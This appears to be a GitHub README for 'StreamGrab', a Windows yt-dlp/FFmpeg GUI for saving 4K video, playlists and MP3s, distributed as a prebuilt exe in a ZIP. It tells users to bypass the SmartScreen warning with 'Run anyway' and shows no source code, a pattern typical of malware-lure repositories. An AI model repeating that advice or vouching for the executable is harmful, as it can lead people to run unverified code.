<p align="center">
  <img src="https://i.postimg.cc/L89tHR4L/banner.png" alt="StreamGrab 4K Video Downloader — Visual yt-dlp GUI With Playlists, MP3 & SponsorBlock" width="100%">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Platform-Windows%2010%2F11%20x64-0078D6?style=flat-square&logo=windows" alt="Platform: Windows 10/11 x64">
  <img src="https://img.shields.io/badge/Mode-4K%20Video%20%26%20MP3%20GUI-2EA44F?style=flat-square" alt="Mode">
  <img src="https://img.shields.io/badge/Release-streamgrab--v1.5-5391FE?style=flat-square" alt="Release Tag">
  <img src="https://img.shields.io/badge/License-MIT-8B5CF6?style=flat-square" alt="License: MIT">
</p>

# StreamGrab 4K Video Downloader — Visual yt-dlp GUI With Playlists, MP3 & SponsorBlock

**Tired of sketchy 'YouTube to MP4' websites full of popups, 720p caps, and missing audio tracks—or memorizing dozens of yt-dlp command-line flags? Paste any link to save crisp 4K/1080p60 MP4 videos, full playlists, or tagged 320 kbps MP3s locally.**

StreamGrab 4K Video Downloader provides an intuitive Windows desktop interface over `yt-dlp` and `FFmpeg`: **automatically merging best video + audio streams into H.264/AV1 MP4, embedding thumbnails and subtitles, and optionally cutting sponsored segments via SponsorBlock**.

This project is aimed at **Windows 10 and Windows 11 (64-bit) creators, researchers, and media archivists** saving personal backups, Creative Commons videos, and lectures offline.

## Quick Use-Case & Troubleshooting Reference

| Scenario / Issue | Cause | Solution |
| --- | --- | --- |
| Web video downloaders cap quality at 720p or mute 1080p60 audio | Websites avoid server-side FFmpeg audio/video stream muxing | Automatically download best video + best audio and mux locally into `.mp4` |
| Typing `yt-dlp -f bestvideo+bestaudio --merge-output-format mp4` is tedious | CLI flags for playlists, SponsorBlock, and thumbnails are hard to remember | Select presets (`4K Best`, `1080p60 MP4`, `MP3 320kbps`) from a dropdown |
| Podcast or tutorial downloads include 2-minute sponsor reads | Raw video streams contain mid-roll sponsor segments | Enable **SponsorBlock Auto-Remove** to cut sponsor segments cleanly |
| Downloading a 40-video course playlist one by one takes hours | Manual link pasting for entire playlists is repetitive | Paste a playlist URL to batch-download numbered `01 - Title.mp4` files |

## Download for Windows

[**Download StreamGrab.zip — Latest GitHub Release (Windows x64)**](../../releases/latest/download/StreamGrab.zip)  
[View All Releases & Changelog](../../releases) · [Report an Issue](../../issues)

### Why use `StreamGrab.exe`? (Key features)

- Downloads `4K (2160p)`, `1440p`, `1080p60`, `720p`, or extracts `320 kbps MP3` / `M4A` / `FLAC` audio.
- Automatically merges separate high-bitrate video and audio streams into compatible `.mp4` / `.mkv` files.
- Supports **Playlist Batch Downloads** with automatic track numbering (`%(playlist_index)s - %(title)s`).
- Optional **SponsorBlock** integration removes sponsor segments and embeds chapters, subtitles, and cover art.

### Sample Output

```text
[StreamGrab] Fetched Metadata: "Blender 4.3 Hard-Surface Tutorial" (24:12 | 3840x2160 60fps)
[INFO] Format Selected  : 2160p60 MP4 (Best Video + Best Audio) | SponsorBlock: ON
[OK]   Merged & Tagged  : D:\Videos\StreamGrab\Blender_4.3_Tutorial_4K.mp4 (642 MB)
```

The release ZIP is named `StreamGrab.zip`; the Windows executable inside is named `StreamGrab.exe`.

1. Close StreamGrab before updating or replacing executable files.
2. Click **Download StreamGrab.zip** above.
3. Right-click the downloaded archive and choose **Extract All**.
4. Open the extracted folder and run `StreamGrab.exe`.
5. Review the options and output paths before processing files.

**Requirements:** Windows 10 or 11 (64-bit) with an active internet connection.

### Verification & Windows SmartScreen Note

- **Offline & standard user permissions:** `StreamGrab.exe` runs locally without uploading your personal files and does not require disabling Windows Defender.
- **Windows SmartScreen:** Because this is an independent open-source utility without a commercial EV code-signing certificate, Windows SmartScreen may show *"Windows protected your PC"* on first launch. Click **More info → Run anyway** after verifying the release checksum on the [Releases](../../releases) page.

## Problems this project solves

### Zero popup ads, fake download buttons, or 720p caps

Fetches streams directly onto your PC without middleman websites.

### Automatic video + audio stream merging

High-resolution 1080p60 and 4K streams are separated by platforms; StreamGrab muxes them seamlessly.

### Clean MP3 extraction with embedded album cover & artist tags

Turns music performances and lectures into ready-to-play audio files.

### Built-in engine updater button

Update the underlying `yt-dlp` binary in one click whenever platforms change formats.

## Default folders and configuration paths

StreamGrab saves downloaded videos and audio files into `Videos\StreamGrab` by default:

```text
%USERPROFILE%\Videos\StreamGrab\
```

Typical directory layout:

```text
%USERPROFILE%\Videos\StreamGrab\
├── Video_Title_1080p.mp4
├── Audio_Track_320kbps.mp3
└── Playlist_Folder\
    ├── 01 - First_Lesson.mp4
    └── 02 - Second_Lesson.mp4
```

Respect copyright laws and platform terms of service; use StreamGrab only for personal offline backups and content you are permitted to download.

## Quick start guide

Follow these steps to get started:

1. **Extract `StreamGrab.zip` to a local folder and launch `StreamGrab.exe`.** No Python installation required.
2. **Paste a video or playlist URL into the top bar.** Choose your quality preset (`4K`, `1080p60 MP4`, `MP3 320kbps`).
3. **Toggle **Embed Subtitles**, **Embed Thumbnail**, or **SponsorBlock** if desired.** Click **Add to Queue / Download**.
4. **Open `Videos\StreamGrab` to watch or listen offline.** Use **Update Engine** in Settings if a site updates its player.

### Data safety note

StreamGrab writes only to your chosen output folder.

## What the status summary shows

StreamGrab displays **video title, duration, available resolutions, selected codec/bitrate, SponsorBlock cuts, and output file size**.

## FAQ

**Why do 1080p60 and 4K downloads need FFmpeg merging?**

Modern video platforms store 1080p+ video and audio as separate streams; StreamGrab combines them locally into a single `.mp4` file.

**Can I download just the MP3 audio from a video or playlist?**

Yes—select 'MP3 (320 kbps)' or 'M4A Best Audio' in the format dropdown.

**How do I update yt-dlp if a download fails after a site change?**

Click 'Update yt-dlp Engine' inside StreamGrab's top toolbar.

## Useful reading

- [yt-dlp Official Open-Source Repository](https://github.com/yt-dlp/yt-dlp)
- [SponsorBlock Open Database](https://sponsor.ajay.app/)

## More Windows Desktop Utilities

- [TurboFetch-MultiThreadDownloader](../TurboFetch-MultiThreadDownloader) — 16-thread HTTP/HTTPS download accelerator with SHA-256 check
- [SnapFormat-BatchMediaConverter](../SnapFormat-BatchMediaConverter) — Offline batch HEIC/WebP/MKV to JPG/PNG/MP4 converter
- [WhisperDesk-OfflineTranscriber](../WhisperDesk-OfflineTranscriber) — Local offline speech-to-text & SRT subtitle generator
- [ShortsCrop-AutoVerticalVideo](../ShortsCrop-AutoVerticalVideo) — Convert 16:9 horizontal videos into 9:16 TikTok/Shorts with captions

*Independent open-source desktop utility for Windows. Users are responsible for complying with copyright laws and content licenses.*
